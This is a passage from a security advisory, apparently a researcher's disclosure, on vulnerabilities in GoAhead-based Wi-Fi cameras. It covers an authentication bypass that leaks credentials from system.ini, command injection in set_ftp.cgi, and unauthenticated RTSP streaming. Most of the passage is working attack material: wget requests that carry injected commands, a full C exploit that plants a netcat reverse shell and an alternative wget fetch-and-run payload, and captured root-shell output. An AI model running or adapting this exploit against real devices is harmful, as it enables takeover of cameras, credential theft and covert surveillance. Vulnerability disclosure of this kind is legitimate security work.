var result="Auth Failed";
</code></pre>
<p>But it appears access to <code>.ini</code> files are not correctly checked. The attacker can bypass the authentication
by providing an empty <code>loginuse</code> and an empty <code>loginpas</code> in the URI:</p>
<pre><code>user@kali$ wget -qO- 'http://192.168.1.107/system.ini?loginuse&amp;loginpas'|xxd|less
00000000: 5749 4649 4341 4d00 0000 0000 0000 0000  WIFICAM.........
00000010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000020: 0000 0100 0000 0000 0000 0000 0000 0000  ................
[...]
00000690: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
000006a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000006b0: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........
[...]
</code></pre>
<p>A PoC is provided:</p>
<pre><code>./expl 192.168.1.107 --get-config | xxd | grep 000003

00000030: 6d53 6563 0a0a 5b2b 5d20 6279 7061 7373  mSec..[+] bypass
00000300: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000310: 0000 0000 0000 0000 0000 0000 0a0a 0a0a  ................
00000320: 0100 0000 0a03 0100 0000 0000 0000 0000  ................
00000330: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000340: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000350: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000360: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000370: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000380: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000390: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000003a0: 0000 0000 0000 0000 0000 6164 6d69 6e00  ..........admin.
000003b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000003c0: 0000 0000 0000 0000 0000 6164 6d69 6e00  ..........admin.
000003d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000003e0: 0000 0000 0000 0000 0000 030a 0a0f 8000  ................
000003f0: 0000 0101 0003 0002 0000 0080 8080 8001  ................
</code></pre>
<p>This vulnerability allows an attacker to steal credentials, ftp accounts and smtp accounts (email).</p>
<p><a id="root-rce"></a></p>
<h2>Details - Authenticated RCE as root</h2>
<p>A RCE exists in the ftp configuration CGI. This is well-documented as shown <a href="https://jumpespjump.blogspot.de/2015/09/how-i-hacked-my-ip-camera-and-found.html">here</a> and <a href="https://www.pentestpartners.com/blog/hacking-the-aldi-ip-cctv-camera-part-2/">here</a> in several different camera models.</p>
<p>The partition <code>/</code> is mounted in Read-Only, so modifications are not possible in this partition.</p>
<p>The command injection is located in in <code>set_ftp.cgi</code> (see <code>$(ftp x.com)</code>):</p>
<pre><code>http://192.168.1.107/set_ftp.cgi?next_url=ftp.htm&amp;loginuse=admin&amp;loginpas=admin&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(ftp x.com)ftp&amp;dir=/&amp;mode=PORT&amp;upload_interval=0
http://192.168.1.107/ftptest.cgi?next_url=test_ftp.htm&amp;loginuse=admin&amp;loginpas=admin
</code></pre>
<p>When doing a tcpdump, we can see the DNS resolution for x.com:</p>
<pre><code>00:00:00.151107 IP 192.168.1.107.33551 &gt; 8.8.8.8.53: 40888+ A? x.com. (23)
</code></pre>
<p>so, <code>ftp x.com</code> is executed.</p>
<p>We can use the telnetd binary to start an authenticated-less telnetd access:</p>
<pre><code>user@kali$ wget -qO- 'http://192.168.1.107/set_ftp.cgi?next_url=ftp.htm&amp;loginuse=admin&amp;loginpas=admin&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(telnetd -p25 -l/bin/sh)&amp;dir=/&amp;mode=PORT&amp;upload_interval=0'
user@kali$ wget -qO- 'http://192.168.1.107/ftptest.cgi?next_url=test_ftp.htm&amp;loginuse=admin&amp;loginpas=admin'
</code></pre>
<p>Testing this will give us root account on port 25/tcp:</p>
<pre><code>user@kali$ telnet 192.168.1.107 25
Trying 192.168.1.107...
Connected to 192.168.1.107.
Escape character is '^]'.

/ # id
uid=0(root) gid=0
/ # uname -ap
Linux apk-link 3.10.14 #5 PREEMPT Thu Sep 22 09:11:41 CST 2016 mips GNU/Linux
/ # mount
rootfs on / type rootfs (rw)
/dev/root on / type squashfs (ro,relatime)
/proc on /proc type proc (rw,relatime)
sysfs on /sys type sysfs (rw,relatime)
tmpfs on /dev type tmpfs (rw,relatime,size=2048k)
tmpfs on /tmp type tmpfs (rw,relatime,size=5120k)
devpts on /dev/pts type devpts (rw,relatime,mode=600,ptmxmode=000)
/dev/mtdblock3 on /system type jffs2 (rw,relatime)
/ #
</code></pre>
<p><code>/etc</code> is in read-only. So, command injection must not write into <code>/etc</code>. The injection is located in <code>/tmp/ftpupload.sh</code>:</p>
<pre><code>/ # cat /tmp/ftpupload.sh 
/bin/ftp -n&lt;&lt;!
open 192.168.1.1 21
user ftp $(telnetd -l /bin/sh -p 25)ftp
binary
lcd /tmp
put ftptest.txt
close
bye
!
/ #
</code></pre>
<p><a id="pre-auth-root-rce"></a></p>
<h2>Details - Pre-Auth RCE as root</h2>
<p>By combining the Pre-Auth Info Leak within the custom http server vulnerability and then authenticated RCE as root, an attacker can achieve a pre-auth RCE as root on a LAN or on the Internet.</p>
<p>An exploit is provided and can be used to get a root RCE with connect-back.</p>
<p>The exploit will:</p>
<ol>
<li>extract the valid credentials by connecting to the remote custom HTTP server of the targeted camera</li>
<li>plant a connect-back with <code>nc</code></li>
<li>execute the payload</li>
<li>the attacker will receive a root shell with netcat on a second terminal</li>
<li>clean the payload located in the configuration file</li>
</ol>
<p>It affects 1250+ camera models.</p>
<p>Demo:</p>
<pre><code>user@kali$ gcc -Wall -o expl expl-goahead-camera.c &amp;&amp; ./expl 192.168.1.107                               
Camera 0day root RCE with connect-back @PierreKimSec

Please run `nc -vlp 1337` on 192.168.1.1

[+] bypassing auth ... done
    login = admin
    pass  = admin
[+] planting payload ... done
[+] executing payload ... done
[+] cleaning payload ... done
[+] cleaning payload ... done
[+] enjoy your root shell on 192.168.1.1:1337
user@kali$
</code></pre>
<p>On the second xterm:</p>
<pre><code>user@kali$ nc -lvp 1337
listening on [any] 1337 ...
192.168.1.107: inverse host lookup failed: Unknown host
connect to [192.168.1.1] from (UNKNOWN) [192.168.1.107] 47968
id
uid=0(root) gid=0
uname -ap
Linux apk-link 3.10.14 #5 PREEMPT Thu Sep 22 09:11:41 CST 2016 mips GNU/Linux
ps  
PID   USER     TIME   COMMAND
    1 root       0:01 {linuxrc} init
    2 root       0:00 [kthreadd]
    3 root       0:00 [ksoftirqd/0]
    5 root       0:00 [kworker/0:0H]
    6 root       0:00 [kworker/u2:0]
    7 root       0:00 [rcu_preempt]
    8 root       0:00 [rcu_bh]
    9 root       0:00 [rcu_sched]
   10 root       0:00 [watchdog/0]
   11 root       0:00 [khelper]
   12 root       0:00 [writeback]
   13 root       0:00 [bioset]
   14 root       0:00 [kblockd]
   15 root       0:00 [khubd]
   16 root       0:00 [kworker/0:1]
   17 root       0:00 [cfg80211]
   18 root       0:00 [rpciod]
   19 root       0:00 [kswapd0]
   20 root       0:00 [fsnotify_mark]
   21 root       0:00 [nfsiod]
   22 root       0:00 [crypto]
   36 root       0:00 [kworker/u2:1]
   39 root       0:00 [i2s_work_1]
   40 root       0:00 [i2s_codec_irq_w]
   41 root       0:00 [kworker/0:2]
   42 root       0:00 [deferwq]
   43 root       0:00 [kworker/0:1H]
   59 root       0:00 [jffs2_gcd_mtd3]
   61 root       0:00 telnetd
   69 root       0:00 /system/system/bin/wifidaemon
   70 root       0:00 /sbin/getty -L ttyS1 115200 vt100
   98 root       0:01 [RtmpTimerTask]
   99 root       0:00 [RtmpMlmeTask]
  100 root       0:00 [RtmpCmdQTask]
  101 root       0:00 [RtmpWscTask]
  148 root       1:19 /tmp/encoder
  164 root       0:00 [irq/37-isp]
  236 root       0:07 [apical_isp_fw_p]
 2330 root       0:00 sh -c /tmp/ftpupload.sh &gt; /tmp/ftpret.txt
 2331 root       0:00 {exe} ash /tmp/ftpupload.sh
 2332 root       0:00 {exe} ash /tmp/ftpupload.sh
 2333 root       0:00 /bin/ftp -n
 2334 root       0:00 /bin/sh
 2439 root       0:00 ps
</code></pre>
<p>A working exploit is provided:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> 
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdio.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;string.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;stdlib.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;unistd.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;arpa/inet.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;netinet/in.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;sys/types.h&gt;</span><span style="color: #BC7A00"></span>
<span style="color: #BC7A00">#include</span> <span style="color: #408080; font-style: italic">&lt;sys/socket.h&gt;</span><span style="color: #BC7A00"></span>

<span style="color: #BC7A00">#define CAM_PORT 80</span>
<span style="color: #BC7A00">#define REMOTE_HOST &quot;192.168.1.1&quot;</span>
<span style="color: #BC7A00">#define REMOTE_PORT &quot;1337&quot;</span>
<span style="color: #BC7A00">#define PAYLOAD_0 &quot;GET /set_ftp.cgi?next_url=ftp.htm&amp;loginuse=%s&amp;loginpas=%s&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(nc%20&quot; REMOTE_HOST &quot;+&quot; REMOTE_PORT &quot;%20-e/bin/sh)&amp;dir=/&amp;mode=PORT&amp;upload_interval=0\r\n\r\n&quot;</span>
<span style="color: #BC7A00">#define PAYLOAD_1 &quot;GET /ftptest.cgi?next_url=test_ftp.htm&amp;loginuse=%s&amp;loginpas=%s\r\n\r\n&quot;</span>
<span style="color: #BC7A00">#define PAYLOAD_2 &quot;GET /set_ftp.cgi?next_url=ftp.htm&amp;loginuse=%s&amp;loginpas=%s&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=passpasspasspasspasspasspasspasspass&amp;dir=/&amp;mode=PORT&amp;upload_interval=0\r\n\r\n&quot;</span>


<span style="color: #BC7A00">#define ALTERNATIVE_PAYLOAD_zero0 &quot;GET /set_ftp.cgi?next_url=ftp.htm&amp;loginuse=%s&amp;loginpas=%s&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(nc+&quot; REMOTE_HOST &quot;+&quot; REMOTE_PORT &quot;+-e/bin/sh)&amp;dir=/&amp;mode=PORT&amp;upload_interval=0\r\n\r\n&quot;</span>
<span style="color: #BC7A00">#define ALTERNATIVE_PAYLOAD_zero1 &quot;GET /set_ftp.cgi?next_url=ftp.htm&amp;loginuse=%s&amp;loginpas=%s&amp;svr=192.168.1.1&amp;port=21&amp;user=ftp&amp;pwd=$(wget+http:</span><span style="color: #408080; font-style: italic">//&quot; REMOTE_HOST &quot;/stufz&amp;&amp;./stuff)&amp;dir=/&amp;mode=PORT&amp;upload_interval=0\r\n\r\n&quot;</span>

<span style="color: #B00040">char</span> <span style="color: #666666">*</span>    <span style="color: #0000FF">creds</span>(<span style="color: #B00040">char</span>  <span style="color: #666666">*</span>argv,
                <span style="color: #B00040">int</span>   get_config);

<span style="color: #B00040">int</span>       <span style="color: #0000FF">rce</span>(<span style="color: #B00040">char</span>    <span style="color: #666666">*</span>argv,
              <span style="color: #B00040">char</span>    <span style="color: #666666">*</span>id,
              <span style="color: #B00040">char</span>    attack[],
              <span style="color: #B00040">char</span>    desc[]);


<span style="color: #B00040">int</span>   <span style="color: #0000FF">main</span>(<span style="color: #B00040">int</span>        argc,
           <span style="color: #B00040">char</span>       <span style="color: #666666">**</span>argv,
           <span style="color: #B00040">char</span>       <span style="color: #666666">**</span>envp)
{
  <span style="color: #B00040">char</span>                <span style="color: #666666">*</span>id;

  printf(<span style="color: #BA2121">&quot;Camera 0day root RCE with connect-back @PierreKimSec</span><span style="color: #BB6622; font-weight: bold">\n\n</span><span style="color: #BA2121">&quot;</span>);

  <span style="color: #008000; font-weight: bold">if</span> (argc <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>)
  {
     printf(<span style="color: #BA2121">&quot;%s target</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, argv[<span style="color: #666666">0</span>]);
     printf(<span style="color: #BA2121">&quot;%s target --get-config      will dump the configuration and exit</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, argv[<span style="color: #666666">0</span>]);
     <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
  }

  <span style="color: #008000; font-weight: bold">if</span> (argc <span style="color: #666666">==</span> <span style="color: #666666">2</span>)
    printf(<span style="color: #BA2121">&quot;Please run `nc -vlp %s` on %s</span><span style="color: #BB6622; font-weight: bold">\n\n</span><span style="color: #BA2121">&quot;</span>, REMOTE_PORT, REMOTE_HOST);

  <span style="color: #008000; font-weight: bold">if</span> (argc <span style="color: #666666">==</span> <span style="color: #666666">3</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #666666">!</span>strcmp(argv[<span style="color: #666666">2</span>], <span style="color: #BA2121">&quot;--get-config&quot;</span>))
    id <span style="color: #666666">=</span> creds(argv[<span style="color: #666666">1</span>], <span style="color: #666666">1</span>);
  <span style="color: #008000; font-weight: bold">else</span>
    id <span style="color: #666666">=</span> creds(argv[<span style="color: #666666">1</span>], <span style="color: #666666">0</span>);

  <span style="color: #008000; font-weight: bold">if</span> (id <span style="color: #666666">==</span> <span style="color: #008000">NULL</span>)
  {
    printf(<span style="color: #BA2121">&quot;exploit failed</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
  }
  printf(<span style="color: #BA2121">&quot;done</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);

  printf(<span style="color: #BA2121">&quot;    login = %s</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, id);
  printf(<span style="color: #BA2121">&quot;    pass  = %s</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, id <span style="color: #666666">+</span> <span style="color: #666666">32</span>);

  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>rce(argv[<span style="color: #666666">1</span>], id, PAYLOAD_0, <span style="color: #BA2121">&quot;planting&quot;</span>))
    printf(<span style="color: #BA2121">&quot;done</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
  sleep(<span style="color: #666666">1</span>);
  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>rce(argv[<span style="color: #666666">1</span>], id, PAYLOAD_1, <span style="color: #BA2121">&quot;executing&quot;</span>))
    printf(<span style="color: #BA2121">&quot;done</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>rce(argv[<span style="color: #666666">1</span>], id, PAYLOAD_2, <span style="color: #BA2121">&quot;cleaning&quot;</span>))
    printf(<span style="color: #BA2121">&quot;done</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>rce(argv[<span style="color: #666666">1</span>], id, PAYLOAD_1, <span style="color: #BA2121">&quot;cleaning&quot;</span>))
    printf(<span style="color: #BA2121">&quot;done</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);

  printf(<span style="color: #BA2121">&quot;[+] enjoy your root shell on %s:%s</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>, REMOTE_HOST, REMOTE_PORT);

  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">0</span>);
}


<span style="color: #B00040">char</span> <span style="color: #666666">*</span>    <span style="color: #0000FF">creds</span>(<span style="color: #B00040">char</span>  <span style="color: #666666">*</span>argv,
                <span style="color: #B00040">int</span>   get_config)
{
  <span style="color: #B00040">int</span>                 sock;
  <span style="color: #B00040">int</span>                 n;
  <span style="color: #008000; font-weight: bold">struct</span> sockaddr_in  serv_addr;
  <span style="color: #B00040">char</span>                buf[<span style="color: #666666">8192</span>] <span style="color: #666666">=</span> { <span style="color: #666666">0</span> };
  <span style="color: #B00040">char</span>                <span style="color: #666666">*</span>out;
  <span style="color: #B00040">char</span>                <span style="color: #666666">*</span>tmp;
  <span style="color: #B00040">char</span>                payload[] <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;GET /system.ini?loginuse&amp;loginpas HTTP/1.0</span><span style="color: #BB6622; font-weight: bold">\r\n\r\n</span><span style="color: #BA2121">&quot;</span>;
  <span style="color: #B00040">int</span>                 old_n;
  <span style="color: #B00040">int</span>                 n_total;


  sock <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
  n <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
  old_n <span style="color: #666666">=</span> <span style="color: #666666">0</span>;
  n_total <span style="color: #666666">=</span> <span style="color: #666666">0</span>;

  printf(<span style="color: #BA2121">&quot;[+] bypassing auth ... &quot;</span>);

  <span style="color: #008000; font-weight: bold">if</span> ((sock <span style="color: #666666">=</span> socket(AF_INET, SOCK_STREAM, <span style="color: #666666">0</span>)) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
  {
    printf(<span style="color: #BA2121">&quot;Error while creating socket</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
  }

  memset(<span style="color: #666666">&amp;</span>serv_addr, <span style="color: #BA2121">&#39;0&#39;</span>, <span style="color: #008000; font-weight: bold">sizeof</span>(serv_addr));
  serv_addr.sin_family <span style="color: #666666">=</span> AF_INET;
  serv_addr.sin_port <span style="color: #666666">=</span> htons(CAM_PORT);

  <span style="color: #008000; font-weight: bold">if</span> (inet_pton(AF_INET, argv, <span style="color: #666666">&amp;</span>serv_addr.sin_addr) <span style="color: #666666">&lt;=</span> <span style="color: #666666">0</span>)
  {
    printf(<span style="color: #BA2121">&quot;Error while inet_pton</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
  }

  <span style="color: #008000; font-weight: bold">if</span> (connect(sock, (<span style="color: #008000; font-weight: bold">struct</span> sockaddr <span style="color: #666666">*</span>)<span style="color: #666666">&amp;</span>serv_addr , <span style="color: #008000; font-weight: bold">sizeof</span>(serv_addr)) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
  {
    printf(<span style="color: #BA2121">&quot;creds: connect failed</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
  }

  <span style="color: #008000; font-weight: bold">if</span> (send(sock, payload, strlen(payload) , <span style="color: #666666">0</span>) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
  {
    printf(<span style="color: #BA2121">&quot;creds: send failed</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
  }

  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>(tmp <span style="color: #666666">=</span> malloc(<span style="color: #666666">10</span> <span style="color: #666666">*</span> <span style="color: #666666">1024</span> <span style="color: #666666">*</span> <span style="color: #008000; font-weight: bold">sizeof</span>(<span style="color: #B00040">char</span>))))
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);

  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>(out <span style="color: #666666">=</span> calloc(<span style="color: #666666">64</span>, <span style="color: #008000; font-weight: bold">sizeof</span>(<span style="color: #B00040">char</span>))))
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);

  <span style="color: #008000; font-weight: bold">while</span> ((n <span style="color: #666666">=</span> recv(sock, buf, <span style="color: #008000; font-weight: bold">sizeof</span>(buf), <span style="color: #666666">0</span>)) <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>)
  {
    n_total <span style="color: #666666">+=</span> n;
    <span style="color: #008000; font-weight: bold">if</span> (n_total <span style="color: #666666">&lt;</span> <span style="color: #666666">1024</span> <span style="color: #666666">*</span> <span style="color: #666666">10</span>)
      memcpy(tmp <span style="color: #666666">+</span> old_n, buf, n);
    <span style="color: #008000; font-weight: bold">if</span> (n <span style="color: #666666">&gt;=</span> <span style="color: #666666">0</span>)
      old_n <span style="color: #666666">=</span> n;
  }

  close(sock);

  <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">  [ HTTP HEADERS ]</span>
<span style="color: #408080; font-style: italic">  ...</span>

<span style="color: #408080; font-style: italic">  000????: 0000 0a0a 0a0a 01.. .... .... .... ....</span>
<span style="color: #408080; font-style: italic">                ^^^^ ^^^^ ^^</span>
<span style="color: #408080; font-style: italic">                Useful reference in the binary data</span>
<span style="color: #408080; font-style: italic">                in order to to find the positions of</span>
<span style="color: #408080; font-style: italic">                credentials</span>
<span style="color: #408080; font-style: italic">  ...</span>
<span style="color: #408080; font-style: italic">  ... </span>
<span style="color: #408080; font-style: italic">  0000690: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........</span>
<span style="color: #408080; font-style: italic">  00006a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span>
<span style="color: #408080; font-style: italic">  00006b0: 6164 6d69 6e00 0000 0000 0000 0000 0000  admin...........</span>
<span style="color: #408080; font-style: italic">  00006c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span>
<span style="color: #408080; font-style: italic">  ...</span>

<span style="color: #408080; font-style: italic">  NOTE: reference can be too:</span>
<span style="color: #408080; font-style: italic">  000????: 0006 0606 0606 0100 000a .... .... ....</span>

<span style="color: #408080; font-style: italic">  Other method: parse everything, find the &quot;admin&quot; string and extract the associated password</span>
<span style="color: #408080; font-style: italic">  by adding 31bytes after the address of &#39;a&#39;[dmin].</span>
<span style="color: #408080; font-style: italic">  Works if the login is admin (seems to be this by default, but can be changed by the user)</span>
<span style="color: #408080; font-style: italic">  */</span>

  <span style="color: #008000; font-weight: bold">if</span> (get_config)
  {
    <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">int</span> j <span style="color: #666666">=</span> <span style="color: #666666">0</span>; j <span style="color: #666666">&lt;</span> n_total <span style="color: #666666">&amp;&amp;</span> j <span style="color: #666666">&lt;</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> <span style="color: #666666">1024</span>; j<span style="color: #666666">++</span>)
      printf(<span style="color: #BA2121">&quot;%c&quot;</span>, tmp[j]);
    exit (<span style="color: #666666">0</span>);
  }


  <span style="color: #008000; font-weight: bold">for</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">int</span> j <span style="color: #666666">=</span> <span style="color: #666666">50</span>; j <span style="color: #666666">&lt;</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> <span style="color: #666666">1024</span>; j<span style="color: #666666">++</span>)
  {
     <span style="color: #008000; font-weight: bold">if</span> (tmp[j <span style="color: #666666">-</span> <span style="color: #666666">4</span>] <span style="color: #666666">==</span> <span style="color: #666666">0x0a</span> <span style="color: #666666">&amp;&amp;</span>
         tmp[j <span style="color: #666666">-</span> <span style="color: #666666">3</span>] <span style="color: #666666">==</span> <span style="color: #666666">0x0a</span> <span style="color: #666666">&amp;&amp;</span>
         tmp[j <span style="color: #666666">-</span> <span style="color: #666666">2</span>] <span style="color: #666666">==</span> <span style="color: #666666">0x0a</span> <span style="color: #666666">&amp;&amp;</span>
         tmp[j <span style="color: #666666">-</span> <span style="color: #666666">1</span>] <span style="color: #666666">==</span> <span style="color: #666666">0x0a</span> <span style="color: #666666">&amp;&amp;</span>
         tmp[j]     <span style="color: #666666">==</span> <span style="color: #666666">0x01</span>)
     {
       <span style="color: #008000; font-weight: bold">if</span> (j <span style="color: #666666">+</span> <span style="color: #666666">170</span> <span style="color: #666666">&lt;</span> <span style="color: #666666">10</span> <span style="color: #666666">*</span> <span style="color: #666666">1024</span>)
       {
         strcat(out, <span style="color: #666666">&amp;</span>tmp[j <span style="color: #666666">+</span> <span style="color: #666666">138</span>]);
         strcat(out <span style="color: #666666">+</span> <span style="color: #666666">32</span> <span style="color: #666666">*</span> <span style="color: #008000; font-weight: bold">sizeof</span>(<span style="color: #B00040">char</span>), <span style="color: #666666">&amp;</span>tmp[j <span style="color: #666666">+</span> <span style="color: #666666">170</span>]);
         free(tmp);

         <span style="color: #008000; font-weight: bold">return</span> (out);
       }
     }
  }

  free(tmp);

  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #008000">NULL</span>);
}

<span style="color: #B00040">int</span>       <span style="color: #0000FF">rce</span>(<span style="color: #B00040">char</span>    <span style="color: #666666">*</span>argv,
              <span style="color: #B00040">char</span>    <span style="color: #666666">*</span>id,
              <span style="color: #B00040">char</span>    attack[],
              <span style="color: #B00040">char</span>    desc[])
{
  <span style="color: #B00040">int</span>                 sock;
  <span style="color: #008000; font-weight: bold">struct</span> sockaddr_in  serv_addr;
  <span style="color: #B00040">char</span>                <span style="color: #666666">*</span>payload;

  <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span>(payload <span style="color: #666666">=</span> calloc(<span style="color: #666666">512</span>, <span style="color: #008000; font-weight: bold">sizeof</span>(<span style="color: #B00040">char</span>))))
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);

  sock <span style="color: #666666">=</span> <span style="color: #666666">0</span>;

  printf(<span style="color: #BA2121">&quot;[+] %s payload ... &quot;</span>, desc);

  <span style="color: #008000; font-weight: bold">if</span> ((sock <span style="color: #666666">=</span> socket(AF_INET, SOCK_STREAM, <span style="color: #666666">0</span>)) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
  {
    printf(<span style="color: #BA2121">&quot;Error while creating socket</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
  }

  memset(<span style="color: #666666">&amp;</span>serv_addr, <span style="color: #BA2121">&#39;0&#39;</span>, <span style="color: #008000; font-weight: bold">sizeof</span>(serv_addr));
  serv_addr.sin_family <span style="color: #666666">=</span> AF_INET;
  serv_addr.sin_port <span style="color: #666666">=</span> htons(CAM_PORT);

  <span style="color: #008000; font-weight: bold">if</span> (inet_pton(AF_INET, argv, <span style="color: #666666">&amp;</span>serv_addr.sin_addr) <span style="color: #666666">&lt;=</span> <span style="color: #666666">0</span>)
  {
    printf(<span style="color: #BA2121">&quot;Error while inet_pton</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
  }

  <span style="color: #008000; font-weight: bold">if</span> (connect(sock, (<span style="color: #008000; font-weight: bold">struct</span> sockaddr <span style="color: #666666">*</span>)<span style="color: #666666">&amp;</span>serv_addr , <span style="color: #008000; font-weight: bold">sizeof</span>(serv_addr)) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
  {
    printf(<span style="color: #BA2121">&quot;rce: connect failed</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
  }


  sprintf(payload, attack, id, id <span style="color: #666666">+</span> <span style="color: #666666">32</span>);
  <span style="color: #008000; font-weight: bold">if</span> (send(sock, payload, strlen(payload) , <span style="color: #666666">0</span>) <span style="color: #666666">&lt;</span> <span style="color: #666666">0</span>)
  {
    printf(<span style="color: #BA2121">&quot;rce: send failed</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>);
    <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">1</span>);
  }

  <span style="color: #008000; font-weight: bold">return</span> (<span style="color: #666666">0</span>);
}
</pre></div>

<p>Alternatively, you can fetch it at <a href="https://pierrekim.github.io/advisories/expl-goahead-camera.c">https://pierrekim.github.io/advisories/expl-goahead-camera.c</a>.</p>
<p><a id="open-streaming"></a></p>
<h2>Details -- CVE-2017-8223 - Misc - Streaming without authentication</h2>
<p>An attacker can use the authenticated-less RTSP server running on the camera on port <code>10554/tcp</code> to watch the streaming without authentication.</p>
<pre><code>user@kali$ vlc rstp://192.168.1.107:10554/tcp/av0_1
</code></pre>
<p>And:</p>
<pre><code>user@kali$ vlc rstp://192.168.1.107:10554/tcp/av0_0
</code></pre>
<p><a id="cloud"></a></p>
<h2>Details -- CVE-2017-8221 -- Misc - "Cloud" (Aka Botnet)</h2>
<p>By default, the camera uses a 'Cloud' functionality.</p>
<p>You can tcpdump the traffic of the camera, which is very scary:</p>
